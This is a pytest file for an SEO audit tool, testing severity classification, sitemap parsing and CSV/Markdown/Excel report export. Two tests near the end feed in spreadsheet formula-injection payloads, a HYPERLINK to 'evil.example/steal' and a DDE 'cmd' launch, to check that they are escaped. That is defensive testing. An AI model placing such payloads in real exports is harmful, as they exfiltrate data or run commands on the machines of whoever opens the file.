"""Bulk audit and report tests that validate orchestration without network access."""

from __future__ import annotations

import json

from seohead.audit.site import (
    SCHEMA,
    SEVERITY_RULES,
    _first_h1,
    _page_row,
    _urls_from_sitemap,
    audit_site,
    classify,
)
from seohead.reports import FORMATS, build_report

# ── finding severity ─────────────────────────────────────────────────────────


def test_severity_rules_are_ordered_from_worst():
    """The first matching rule wins, so critical rules must precede warnings."""
    levels = [level for _, level in SEVERITY_RULES]
    assert levels == sorted(levels, key=lambda x: {"critical": 0, "warning": 1}.get(x, 2))


def test_page_that_robots_see_empty_is_critical():
    assert classify('raw HTML contains an empty container <div id="root">') == "critical"
    assert classify("the crawler receives an empty page") == "critical"


def test_self_removal_from_index_is_critical():
    assert classify("regional pages are canonicalized to another host") == "critical"
    assert classify("regional pages use noindex") == "critical"


def test_ordinary_observation_is_a_notice():
    assert classify("brotli is not enabled") == "notice"
    assert classify("") == "notice"


# ── page list ────────────────────────────────────────────────────────────────


def test_urls_are_read_from_the_sitemap_records():
    sitemap = {
        "count": 3,
        "urls": [
            {"loc": "https://example.com/a", "lastmod": "2026-01-01"},
            {"loc": "https://example.com/b"},
            {"loc": "https://example.com/a"},  # duplicate
        ],
    }
    assert _urls_from_sitemap(sitemap, 10) == [
        "https://example.com/a",
        "https://example.com/b",
    ]


def test_plain_string_urls_work_too():
    assert _urls_from_sitemap({"urls": ["https://example.com/x"]}, 5) == ["https://example.com/x"]


def test_limit_is_respected():
    sitemap = {"urls": [{"loc": f"https://example.com/{i}"} for i in range(100)]}
    assert len(_urls_from_sitemap(sitemap, 7)) == 7


def test_nested_shapes_are_still_walked():
    """A response-shape change must not silently reduce the audit to zero URLs."""
    weird = {"sitemaps": [{"entries": [{"loc": "https://example.com/deep"}]}]}
    assert _urls_from_sitemap(weird, 5) == ["https://example.com/deep"]


# ── page row ─────────────────────────────────────────────────────────────────

PARSE_RESULT = {
    "count": 1,
    "results": [
        {
            "url": "https://example.com/p",
            "status_code": 200,
            "title": "Page title",
            "meta_description": "Page description",
            "canonical": "https://example.com/p",
            "word_count": 640,
            "headings": {"h1": ["Primary H1"]},
        }
    ],
}


def test_page_row_reads_the_batch_shape_of_parse():
    """Parse returns a batch shape; reading its top level would empty report columns."""
    row = _page_row("https://example.com/p", {"parse": PARSE_RESULT})
    assert row["status"] == 200
    assert row["words"] == 640
    assert row["title_length"] == len("Page title")
    assert row["description_length"] == len("Page description")
    assert row["h1"] == "Primary H1"


def test_h1_is_found_in_any_of_the_known_shapes():
    assert _first_h1({"h1": "direct value"}) == "direct value"
    assert _first_h1({"headings": {"h1": ["from mapping"]}}) == "from mapping"
    assert _first_h1({"headings": [{"level": "h1", "text": "from list"}]}) == "from list"
    assert _first_h1({}) == ""


def test_failed_tool_becomes_a_page_issue_not_silence():
    row = _page_row(
        "https://example.com/p",
        {"schema_check": {"ok": False, "error": "request timed out"}},
    )
    assert any("request timed out" in issue for issue in row["issues"])


def test_page_row_reads_schema_types_from_current_entity_shape():
    row = _page_row(
        "https://example.com/p",
        {
            "schema_check": {
                "ok": True,
                "entities": [
                    {"path": "$[0]", "types": ["WebPage"], "errors": [], "warnings": []},
                    {"path": "$[1]", "types": ["Organization"], "errors": [], "warnings": []},
                    {"path": "$[2]", "types": ["WebPage"], "errors": [], "warnings": []},
                ],
            }
        },
    )
    assert row["schema_types"] == "Organization, WebPage"


# ── input boundaries ─────────────────────────────────────────────────────────


def test_bad_input_is_rejected_before_any_network_call():
    assert audit_site("")["ok"] is False
    assert audit_site("not a URL")["ok"] is False
    assert audit_site("https://example.com/", limit="many")["ok"] is False


# ── reports ──────────────────────────────────────────────────────────────────

DOCUMENT = {
    "ok": True,
    "schema": SCHEMA,
    "url": "https://example.com/",
    "domain": "example.com",
    "generated_at": "2026-08-13T00:00:00+00:00",
    "site": {
        "tech_detect": {
            "technologies": [
                {"category": "cms", "name": "Bitrix CMS", "evidence": "found /bitrix/ in HTML"}
            ]
        },
        "domain_profile": {
            "registration": {"registrar": "RU-CENTER", "created": "2020-01-01", "age_years": 6.6}
        },
    },
    "pages": [
        {
            "url": "https://example.com/a",
            "status": 200,
            "title": "A",
            "title_length": 1,
            "description_length": 0,
            "h1": "A",
            "canonical": "https://example.com/a",
            "words": 500,
            "schema_types": "Product",
            "schema_errors": 0,
            "social_missing": 2,
            "issues": [],
        }
    ],
    "findings": [
        {"source": "render_check", "severity": "critical", "text": "empty page"},
        {"source": "cdn_check", "severity": "notice", "text": "brotli is not enabled"},
    ],
    "summary": {
        "pages_checked": 1,
        "findings_total": 2,
        "findings_by_severity": {"critical": 1, "warning": 0, "notice": 1},
        "tools_run": ["cdn_check"],
        "tools_failed": [{"tool": "log_analyze", "error": "file is unavailable"}],
        "severity_note": "severity is assigned by the aggregation rules",
    },
}


def test_every_format_produces_a_file(tmp_path):
    for fmt in FORMATS:
        result = build_report(DOCUMENT, fmt=fmt, path=str(tmp_path / f"r.{fmt}"))
        assert result["ok"] is True, f"{fmt}: {result.get('error')}"
        assert result["bytes"] > 0, f"{fmt}: empty output file"


def test_csv_writes_pages_as_a_second_file(tmp_path):
    """Findings and pages are separate entities and require separate tables."""
    target = tmp_path / "r.csv"
    build_report(DOCUMENT, fmt="csv", path=str(target))
    assert target.exists() and target.with_suffix(".pages.csv").exists()


def test_csv_is_written_with_bom_for_excel(tmp_path):
    """The BOM lets Excel detect UTF-8 correctly for multilingual report data."""
    target = tmp_path / "r.csv"
    build_report(DOCUMENT, fmt="csv", path=str(target))
    assert target.read_bytes().startswith(b"\xef\xbb\xbf")


def test_markdown_keeps_the_failed_tools_visible(tmp_path):
    target = tmp_path / "r.md"
    build_report(DOCUMENT, fmt="md", path=str(target))
    text = target.read_text(encoding="utf-8")
    assert "Unavailable checks" in text and "log_analyze" in text
    assert "Critical" in text


def test_excel_has_the_four_sheets(tmp_path):
    from openpyxl import load_workbook

    target = tmp_path / "r.xlsx"
    build_report(DOCUMENT, fmt="xlsx", path=str(target))
    wb = load_workbook(target)
    assert wb.sheetnames == ["Summary", "Findings", "Pages", "Technologies"]


def test_unknown_format_is_data_not_a_crash():
    result = build_report(DOCUMENT, fmt="pdf")
    assert result["ok"] is False and "pdf" in result["error"]


def test_report_can_be_built_from_a_json_path(tmp_path):
    source = tmp_path / "audit.json"
    source.write_text(json.dumps(DOCUMENT, ensure_ascii=False), encoding="utf-8")
    result = build_report(str(source), fmt="md", path=str(tmp_path / "out.md"))
    assert result["ok"] is True and result["findings"] == 2


def test_missing_audit_file_is_reported_clearly():
    result = build_report("/nope/audit.json", fmt="md")
    assert result["ok"] is False and "audit file not found" in result["error"]


def test_empty_audit_still_produces_a_report(tmp_path):
    """An audit with no findings is a valid short report, not an error."""
    result = build_report(
        {"domain": "example.com", "findings": [], "pages": [], "summary": {}},
        fmt="md",
        path=str(tmp_path / "e.md"),
    )
    assert result["ok"] is True and result["findings"] == 0


def test_excel_sheets_have_no_blank_row_under_the_header(tmp_path):
    """Header styling must not materialize a blank row before the first record."""
    from openpyxl import load_workbook

    target = tmp_path / "r.xlsx"
    build_report(DOCUMENT, fmt="xlsx", path=str(target))
    wb = load_workbook(target)
    for name, expected in (
        ("Findings", len(DOCUMENT["findings"])),
        ("Pages", len(DOCUMENT["pages"])),
    ):
        ws = wb[name]
        assert ws.max_row - 1 == expected, f"{name}: unexpected rows below the header"
        first = next(ws.iter_rows(min_row=2, values_only=True))
        assert any(v is not None for v in first), f"{name}: first data row is empty"


def test_formula_leading_titles_are_neutralized_in_xlsx(tmp_path):
    """A crawled page's own title must not become a live spreadsheet formula (#153)."""
    import copy

    from openpyxl import load_workbook

    for lead in ("=", "+", "-", "@"):
        doc = copy.deepcopy(DOCUMENT)
        doc["pages"][0]["title"] = f'{lead}HYPERLINK("http://evil.example/steal","click")'
        doc["findings"][0]["text"] = f"{lead}cmd|' /C calc'!A0"
        target = tmp_path / f"r-{ord(lead)}.xlsx"
        build_report(doc, fmt="xlsx", path=str(target))
        wb = load_workbook(target)
        title_cell = wb["Pages"]["C2"]
        finding_cell = wb["Findings"]["D2"]
        assert title_cell.data_type == "s", f"lead {lead!r}: title became a live formula"
        assert finding_cell.data_type == "s", f"lead {lead!r}: finding text became a live formula"
        assert title_cell.value == "'" + doc["pages"][0]["title"]


def test_formula_leading_titles_are_neutralized_in_csv(tmp_path):
    """The CSV field must not begin with a formula-leading character either (#153)."""
    import copy
    import csv

    for lead in ("=", "+", "-", "@"):
        doc = copy.deepcopy(DOCUMENT)
        doc["pages"][0]["title"] = f'{lead}HYPERLINK("http://evil.example/steal","click")'
        target = tmp_path / f"r-{ord(lead)}.csv"
        build_report(doc, fmt="csv", path=str(target))
        with target.with_suffix(".pages.csv").open(encoding="utf-8-sig", newline="") as fh:
            rows = list(csv.reader(fh, delimiter=";"))
        title_field = rows[1][2]  # columns: url, status, title, ...
        assert not title_field.startswith(lead), f"lead {lead!r} reached the CSV cell unescaped"
        assert title_field.startswith("'")


def test_ordinary_titles_are_written_byte_for_byte_unchanged(tmp_path):
    """Titles/finding text with no formula-leading character must pass through untouched."""
    from openpyxl import load_workbook

    target = tmp_path / "r.xlsx"
    build_report(DOCUMENT, fmt="xlsx", path=str(target))
    wb = load_workbook(target)
    assert wb["Pages"]["C2"].value == DOCUMENT["pages"][0]["title"]
    assert wb["Findings"]["D2"].value == DOCUMENT["findings"][0]["text"]


def test_missing_key_security_headers_are_warnings_not_notices():
    """Missing HSTS and CSP must remain actionable warnings, not generic notices."""
    assert classify("missing strict-transport-security — enforce HTTPS") == "warning"
    assert classify("missing content-security-policy — restrict script sources") == "warning"
    assert classify("missing permissions-policy — camera access") == "notice"
